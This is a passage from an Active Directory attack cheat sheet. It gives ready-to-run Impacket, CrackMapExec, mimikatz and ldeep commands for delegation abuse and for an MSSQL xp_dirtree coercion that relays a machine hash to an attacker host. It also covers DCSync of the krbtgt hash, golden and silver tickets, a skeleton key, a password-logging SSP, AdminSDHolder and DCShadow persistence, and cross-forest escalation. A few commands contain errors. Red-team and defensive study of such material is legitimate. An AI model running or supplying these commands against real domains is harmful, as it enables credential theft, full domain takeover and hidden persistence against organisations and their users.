* ServiceB is allowed to delegate to `time/ServiceC` (the target) without protocol transition (no S4USelf)
* Attacker configures RBCD from ServiceA to ServiceB and performs a full S4U attack to obtain a forwardable TGS for the Administrator to ServiceB
* Attacker reuses this forwardable TGS as evidence to realise a S4UProxy attack from ServiceB to `time/ServiceC`
* Since the service is not protected in the obtained ticket, the attacker can change the TGS from the previous S4UProxy execution to `cifs/ServiceC`

```bash
#RBCD from A to B
rbcd.py -action write -delegate-from ServiceA$ -delegate-to ServiceB$ -hashes ':<ServiceA_NThash>' domain.local/ServiceA$
getST.py -spn 'cifs/serviceB.domain.local' -impersonate administrator -hashes ':<ServiceA_NThash>' -dc-ip <DC_IP> domain.local/ServiceA$

#S4UProxy from B to C with the obtained TGS as evidence
getST.py -spn 'cifs/serviceC.domain.local' -additional-ticket ./administrator.ccache -hashes ':<ServiceB_NThash>' -dc-ip <DC_IP> domain.local/ServiceB$
```

#### RBCD from MSSQL server

If we have sufficient access to a MSSQL server we can use the `xp_dirtree` in order to leak the Net-NTLM hash of the machine account. Additionally, the **Web Service** client must be running on the machine in order to trick the authentication from SMB to HTTP and avoid the NTLM signature (authentication must be sent to `@80`):

* Create a DNS record in order to be able to leak the NTLM hash externally
* Use the `xp_dirtree` (or `xp_fileexist`) function to the created DNS record on `@80`. This will force the authentication and leak the hash
* Relay the machine hash to the LDAP server to add a controlled account (**with a SPN** for the further S4USelf request) to the `msDS-AllowedToActOnBehalfOfOtherIdentity` of the target machine
* Now we can ask a TGS for a user we want to impersonate for a service on the machine

```bash
#Add the DNS
python3 dnstool.py -u 'domain.local\user1' -p 'password' -r 'attacker.domain.local' -d '<attacker_IP>' --action add <DC_IP>

#On our machine, waiting for the leak
#https://gist.github.com/3xocyte/4ea8e15332e5008581febdb502d0139c
python rbcd_relay.py 192.168.24.10 domain.local 'target$' <controlledAccountWithASPN>

#ON the MSSQL server
SQLCMD -S <MSSQL_instance> -Q "exec master.dbo.xp_dirtree '\\attacker@80\a'" -U Admin -P Admin

#After the attack, ask for a TGS with full S4U
getST.py -spn cifs/target.domain.local -impersonate admininistrator -dc-ip <DC_IP> domain.local/<controlledAccountWithASPN>password
```

## Domain Persistence

### Golden Ticket

#### Dump krbtgt hash with DCSync

```bash
secretsdump.py -just-dc-user 'krbtgt' -just-dc-ntlm domain.local/administrator:password@<DC>
```

#### Create TGT

```bash
ticketer.py -domain domain.local -domain-sid <domain_SID> -nthash <krbtgt_hash> -user-id <target_RID> -duration <ticket_lifetime_in_day> <target_user>
```

### Silver Ticket

```bash
ticketer.py -domain domain.local -domain-sid <domain_SID> -spn 'cifs/target' -nthash <krbtgt_hash> -user-id <target_RID> -duration <ticket_lifetime_in_day> <target_user>
```

### Skeleton Key

```bash
crackmapexec smb <DC_IP> -u 'Administrator' -p 'password' -M mimikatz -o COMMAND='misc::skeleton'
```

Now, it is possible to access any machine with a valid username and password as "mimikatz"

### DSRM

* DSRM is Directory Services Restore Mode
* The local administrator on every DC can authenticate with the DSRM password
* It is possible to pass the hash of this user to access the DC after modifying the DC configuration

#### Dump DSRM password

```bash
crackmapexec smb <DC_IP> -u user1 -p password --sam
```

#### Change registry configuration

Need to change the logon behavior before pass the hash

```bash
reg.py -dc-ip <DC_IP> 'domain.local'/'Administrator':'password'@dc.domain.local add -keyName 'HKLM\\System\\CurrentControlSet\\Control\\Lsa\\' -v 'DsrmAdminLogonBehavior' -vd 2 -vt REG_DWORD
```

Now the DSRM hash ca be used to authenticate

### Custom SSP

SSP are DDLs that provide ways to authenticate for the application. For example Kerberos, NTLM, WDigest, etc. Mimikatz provides a custom SSP that permits to log in a file in clear text the passwords of the users that authenticate on the machine.

* By patching LSASS (really instable since Server 2016)

```bash
crackmapexec smb <target> -u user1 -p password -M mimikatz -o COMMAND='misc::memssp'
```

* By modifying the LSA registry

Upload the `mimilib.dll` to **system32** and add mimilib to `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages` :

```bash
#Retrieve the actual values of Security Package
reg.py -dc-ip <DC_IP> 'domain.local'/'Administrator':'password'@dc.domain.local query -keyName 'HKLM\\System\\CurrentControlSet\\Control\\Lsa\\' -v 'Security Packages' -s

#Append mimilib to the previous list
reg.py -dc-ip <DC_IP> 'domain.local'/'Administrator':'password'@dc.domain.local add -keyName 'HKLM\\System\\CurrentControlSet\\Control\\Lsa\\' -v 'Security Packages' -vd "<list> mimilib" -vt REG_MULTI_SZ
```

### ACLs - AdminSDHolder

AdminSDHolder is a solution that compares the ACLS of the objects with `AdminCount=1` with a list of ACLs. If the ACLs of the objects are different, they are overwritten. The script run normally every hour.

#### Attack

* With write privs on the AdminSDHolder object, it can be used for persistence by adding a user with Full Permissions to the AdminSDHolder object for example.
* When the automatique script will run, the user will be added with Full Control to the AC of groups like Domain Admins.

```bash
dacledit.py -action write -target-dn 'CN=AdminSDHolder,CN=System,DC=DOMAIN,DC=LOCAL' -principal user1 -rights FullControl -ace-type allowed -dc-ip <DC_IP> 'domain.local'/'administrator':'password'
```

#### Check Domain Admin ACLs

```bash
dacledit.py -action read -target "Domain Admins" -principal user1 -dc-ip <DC_IP> domain.local/user1:password
```

### ACLs - Interesting rights

The ACLs can be used for persistence purpose by adding interesting rights like DCSync, FullControl over the domain, etc. Check the ACLs attacks section.

## Cross-Trust Movement

### Child To Parent Domain

Escalate from a child domain to the root domain of the forest by forging a Golden Ticket with the SID of the **Enterprise Admins** group in the SID history field.

#### With the krbtgt hash

```bash
#The new Golden Ticket will be written at the path specified in -w
raiseChild.py -w ./ticket.ccache child.domain.local/Administrator:password

#Dump the Administrator's hash of the root domain
raiseChild.py child.domain.local/Administrator:password

#PSEXEC on a machine
raiseChild.py -target-exec <target> child.domain.local/Administrator:password
```

### Across Forest - Inbound trust

#### Get the Trust Key

```bash
secretsdump.py domain.local:Administrator:password 
```

#### Get the ForeignSecurityPrincipal

```bash
#These SIDs can access to the target domain
ldeep ldap -u user1 -p password -d domain.local -s <target_LDAP_server_IP> search '(objectclass=foreignSecurityPrincipal)' | jq '.[].objectSid'

#The found SID can be search in the current forest
ldeep ldap -u user1 -p password -d domain.local -s <LDAP_server_IP> search '(objectSid=<object_SID>)'
```

#### Forge the inter-forest TGT

`ticketer.py` doesn't work really well with Inter-Realm TGT, it's preferable to use **Mimikatz** for this.

```bash
ticketer.py -domain domain.local -domain-sid <domain_SID> -extra-sid <target_domain_SID> -aesKey <aes_trust_key> -user-id <target_RID> <target_user>
export KRB5CCNAME=./ticket.ccache
```

#### Get a TGS

```bash
getST.py -k -no-pass -spn CIFS/dc.targetDomain.local -dc-ip <target_DC_IP> targetDomain.local/user
```

### Across Forest - PAM Trust

The goal is to compromise the **bastion** forest and pivot to the **production** forest to access to all the resources with a **Shadow Security Principal** mapped to a high priv group.

#### Check if the current forest is a bastion forest

Enumerate trust properties
* `ForestTransitive` must be **true**
* `SIDFilteringQuarantined` must be **false**

```bash
ldeep ldap -u user1 -p password -d domain.local -s <LDAP_server_IP> trusts
```

Enumerate shadow security principals

```bash
ldeep ldap -u user1 -p password -d domain.local -s <LDAP_server_IP> search '(distinguishedName=*Shadow Principal Configuration*)' |jq '.[].name, .[].member, .[]."msDS-ShadowPrincipalSid"'
```

#### Check if the current forest is managed by a bastion forest

`ForestTransitive` must be **true**

```bash
ldeep ldap -u user1 -p password -d domain.local -s <LDAP_server_IP> trusts
```

A trust attribute of `1096` is for PAM (`0x00000400`) + External Trust (`0x00000040`) + Forest Transitive (`0x00000008`).

#### Get the shadow security principals

```bash
ldeep ldap -u user1 -p password -d domain.local -s <LDAP_server_IP> object "Shadow Principal Configuration" -v |jq '.[].name, .[].member, .[]."msDS-ShadowPrincipalSid"'
```


* `Name` - Name of the shadow principal
* `member` - Members from the bastion forest which are mapped to the shadow principal
* `msDS-ShadowPrincipalSid` - The SID of the principal (user or group) in the user/prodcution forest whose privileges are assgined to the shadow security principal. In our example, it is the Enterpise Admins group in the user forest

These users can access the production forest through the trust with classic workflow (PSRemoting, RDP, etc), or with `SIDHistory` injection since `SIDFiltering` in a **PAM Trust**.

## Forest Persistence - DCShadow

**MUST BE TESTED MORE CORRECTLY**

* DCShadow permits to create a rogue Domain Controller on a standard computer in the AD. This permits to modify objects in the AD without leaving any logs on the real Domain Controller
* The compromised machine must be in the **root domain** on the forest, and the command must be executed as DA (or similar)

The attack needs 2 instances on the compromised machine.

* One to start RPC servers with SYSTEM privileges and specify attributes to be modified

```bash
crackmapexec smb <target> -u Administrator -p password -M mimikatz -o COMMAND='"token::elevate" "privilege::debug" "lsadump::dcshadow /object:<object_to_modify> /attribute:<attribute_to_modify> /value=<value_to_set>"'
```

* And second with enough privileges (DA or otherwise) to push the values :

```bash
crackmapexec smb <target> -u Administrator -p password -M mimikatz -o COMMAND='lsadump::dcshadow /push' --server-port 8080
```

### Set interesting attributes

#### Set SIDHistory to Enterprise Admin

```bash
lsadump::dcshadow /object:user1 /attribute:SIDHistory /value:S-1-5-21-280534878-1496970234-700767426-519
```

#### Modify primaryGroupID

```bash
lsadump::dcshadow /object:user1 /attribute:primaryGroupID /value:519
```

#### Set a SPN on an user

```bash
lsadump::dcshadow /object:user1 /attribute:servicePrincipalName /value:"Legitime/User1"
```

## References

* [The Hacker Recipes](https://www.thehacker.recipes)
* [Pentester Academy](https://www.pentesteracademy.com)
* [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md)
* [Cube0x0](https://cube0x0.github.io)
* [HackTricks](https://book.hacktricks.xyz/welcome/readme)
* [Haax](https://cheatsheet.haax.fr/)
* [Red Teaming Experiments](https://www.ired.team)
* [SpecterOps](https://posts.specterops.io)
* [BloodHound](https://bloodhound.readthedocs.io/en/latest/index.html)
* [Dirk-jan Mollema](https://dirkjanm.io)
* [Snovvcrash](https://ppn.snovvcrash.rocks)
* [Exploit.ph](https://exploit.ph/)
* [Wagging the Dog](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
* [Pentestlab.blog](https://pentestlab.blog/)
* [Hack The Box](https://www.hackthebox.com/)